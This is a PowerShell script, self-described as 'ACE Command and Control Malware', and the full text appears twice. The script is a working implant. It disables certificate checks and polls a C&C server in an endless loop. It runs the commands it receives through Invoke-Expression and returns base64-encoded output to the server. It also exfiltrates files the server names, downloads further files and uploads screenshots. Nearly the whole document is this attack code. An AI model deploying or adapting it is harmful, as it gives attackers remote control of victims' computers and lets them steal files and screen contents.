<#
ACE Command and Control Malware
Objective is to create a program/script that will reach out to a C&C Server to obtain commands
This program should also be able to exfil data

Current goal is to make a script that:
A) reaches out to a C&C (either scp, ssh or directly to a webpage)
    - Currently via webpag
B) Receive commands needed
    - Currently checks webpage for command
C) perform commands
    - Executes commands
D) send results back to C&C server (part 1 of exfil)
    - Sends results back by base64 encode and post request to webpage
E) send files back to C&C server (csv, txt, or w/e)



v0.2 
    - Added HTTPS
    - Modified Run Command to use "DownloadString" for "GET" instead of Invoke Web Request
    - Mofified Upload (victim to attacker) to use "UploadString" for POST request
    - Modified Screenshot to use UploadString for PUT request

v0.3
    - Fixed requests to not go to ServerRequirements, instead it's in a single directory (known by server) .. so just go to <IP>:<port> for commands. Everything will be placed in that same directory (root of 'web server'). Everything will be handled by web server
    - Added comments

#>


while ($true)
{ $i++

Add-Type @"
    using System;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    public class ServerCertificateValidationCallback{
        public static void Ignore(){
            ServicePointManager.ServerCertificateValidationCallback += delegate(
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
        }
    }
"@


[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ccserver = "192.168.9.4:80" # IP of C&C server
$web = New-Object System.Net.WebClient
$Path = $env:UserProfile + "\AppData\Local\Temp\" # Path of Temp in UserProfile
$commandPath = $Path + "command.txt" # Command.txt of Path of temp


if(Test-Path $commandPath) {
} else {
New-Item -Path $Path -Name "command.txt" -ItemType "file" -Value "whoami"
}

$PreviousCommand = [IO.File]::ReadAllText($commandPath)

Try{
$Command = $web.DownloadString("https://$ccserver/cc.js")
Write-Output $Command
}
Catch{
Write-Warning $error[0].Exception.InnerException
}

$a = $Command -replace "`n","," 
$b = $a -split ',' 
$CurrentCommand = $b[1]
$Indicator = $b[0]



if($Indicator -eq '1' -And $PreviousCommand -ne $CurrentCommand) {
    write-host "Found a command, running it"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    $CommandOutput = Invoke-Expression $CurrentCommand
    $Bytes1 = [System.Text.Encoding]::Unicode.GetBytes($CurrentCommand)
    $EncodedCommand = [Convert]::ToBase64String($Bytes1)

    $Bytes2 = [System.Text.Encoding]::Unicode.GetBytes($CommandOutput)
    $EncodedOutput = [Convert]::ToBase64String($Bytes2)

    try {
        $respond = $web.DownloadString("https://$ccserver/$EncodedCommand/$EncodedOutput")
        $StatusCode = $Response.StatusCode
        }
    catch {
        $StatusCode = $_.Exception.Response.StatusCode.value__
        Write-Warning $error[0].Exception.InnerException
        }
} 

elseif($Indicator -eq '2' -And $PreviousCommand -ne $CurrentCommand) {
    write-host "Time to upload a file!"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    write-host "File to get is:" $CurrentCommand


    $body = "$(get-content $CurrentCommand -raw)"
    $respond = $web.UploadString("https://$ccserver", $body)
    $StatusCode = $Response.StatusCode

    $StatusCode

} 
elseif($Indicator -eq '3' -And $PreviousCommand -ne $CurrentCommand) {
    write-host "Downloading file..."
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    $CommandOutput = $web.DownloadFile("https://$ccserver/$CurrentCommand", $CurrentCommand)
    
    Start-Sleep -s 5

} 
elseif($Indicator -eq '4' -And $PreviousCommand -ne $CurrentCommand){
    write-host "Taking screenshot..."
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine
    $CaptureFile = '.\Screenshot.bmp'
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
    $bitmap.Save($CaptureFile)
    Write-Output "Screenshot saved to:"
    Write-Output $CaptureFile

    write-host "File to get is:" $CaptureFile

    $base64Image = [convert]::ToBase64String((get-content $CaptureFile -encoding byte))
    $respond = $web.UploadString("https://$ccserver/screenshot1.bmp", "PUT", $base64Image)
    $StatusCode = $Response.StatusCode

    $StatusCode
    
    Start-Sleep -s 5
}
elseif($Indicator -eq '5' -And $PreviousCommand -ne $CurrentCommand){
    write-host "Let's enumerate"
}
else {
    write-host "Duplicate commands or invalid request. Let's take a breather"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine
}


Start-Sleep -s 5

} # End infinit loop

<#
ACE Command and Control Malware
Objective is to create a program/script that will reach out to a C&C Server to obtain commands
This program should also be able to exfil data

Current goal is to make a script that:
A) reaches out to a C&C (either scp, ssh or directly to a webpage)
    - Currently via webpag
B) Receive commands needed
    - Currently checks webpage for command
C) perform commands
    - Executes commands
D) send results back to C&C server (part 1 of exfil)
    - Sends results back by base64 encode and post request to webpage
E) send files back to C&C server (csv, txt, or w/e)



v0.2 
    - Added HTTPS
    - Modified Run Command to use "DownloadString" for "GET" instead of Invoke Web Request
    - Mofified Upload (victim to attacker) to use "UploadString" for POST request
    - Modified Screenshot to use UploadString for PUT request

v0.3
    - Fixed requests to not go to ServerRequirements, instead it's in a single directory (known by server) .. so just go to <IP>:<port> for commands. Everything will be placed in that same directory (root of 'web server'). Everything will be handled by web server
    - Added comments

#>


while ($true)
{ $i++

Add-Type @"
    using System;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    public class ServerCertificateValidationCallback{
        public static void Ignore(){
            ServicePointManager.ServerCertificateValidationCallback += delegate(
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
        }
    }
"@


[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ccserver = "192.168.9.4:80" # IP of C&C server
$web = New-Object System.Net.WebClient
$Path = $env:UserProfile + "\AppData\Local\Temp\" # Path of Temp in UserProfile
$commandPath = $Path + "command.txt" # Command.txt of Path of temp


if(Test-Path $commandPath) {
} else {
New-Item -Path $Path -Name "command.txt" -ItemType "file" -Value "whoami"
}

$PreviousCommand = [IO.File]::ReadAllText($commandPath)

Try{
$Command = $web.DownloadString("https://$ccserver/cc.js")
Write-Output $Command
}
Catch{
Write-Warning $error[0].Exception.InnerException
}

$a = $Command -replace "`n","," 
$b = $a -split ',' 
$CurrentCommand = $b[1]
$Indicator = $b[0]



if($Indicator -eq '1' -And $PreviousCommand -ne $CurrentCommand) {
    write-host "Found a command, running it"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    $CommandOutput = Invoke-Expression $CurrentCommand
    $Bytes1 = [System.Text.Encoding]::Unicode.GetBytes($CurrentCommand)
    $EncodedCommand = [Convert]::ToBase64String($Bytes1)

    $Bytes2 = [System.Text.Encoding]::Unicode.GetBytes($CommandOutput)
    $EncodedOutput = [Convert]::ToBase64String($Bytes2)

    try {
        $respond = $web.DownloadString("https://$ccserver/$EncodedCommand/$EncodedOutput")
        $StatusCode = $Response.StatusCode
        }
    catch {
        $StatusCode = $_.Exception.Response.StatusCode.value__
        Write-Warning $error[0].Exception.InnerException
        }
} 

elseif($Indicator -eq '2' -And $PreviousCommand -ne $CurrentCommand) {
    write-host "Time to upload a file!"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    write-host "File to get is:" $CurrentCommand


    $body = "$(get-content $CurrentCommand -raw)"
    $respond = $web.UploadString("https://$ccserver", $body)
    $StatusCode = $Response.StatusCode

    $StatusCode

} 
elseif($Indicator -eq '3' -And $PreviousCommand -ne $CurrentCommand) {
    write-host "Downloading file..."
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    $CommandOutput = $web.DownloadFile("https://$ccserver/$CurrentCommand", $CurrentCommand)
    
    Start-Sleep -s 5

} 
elseif($Indicator -eq '4' -And $PreviousCommand -ne $CurrentCommand){
    write-host "Taking screenshot..."
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine
    $CaptureFile = '.\Screenshot.bmp'
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
    $bitmap.Save($CaptureFile)
    Write-Output "Screenshot saved to:"
    Write-Output $CaptureFile

    write-host "File to get is:" $CaptureFile

    $base64Image = [convert]::ToBase64String((get-content $CaptureFile -encoding byte))
    $respond = $web.UploadString("https://$ccserver/screenshot1.bmp", "PUT", $base64Image)
    $StatusCode = $Response.StatusCode

    $StatusCode
    
    Start-Sleep -s 5
}
elseif($Indicator -eq '5' -And $PreviousCommand -ne $CurrentCommand){
    write-host "Let's enumerate"
}
else {
    write-host "Duplicate commands or invalid request. Let's take a breather"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine
}


Start-Sleep -s 5

} # End infinit loop

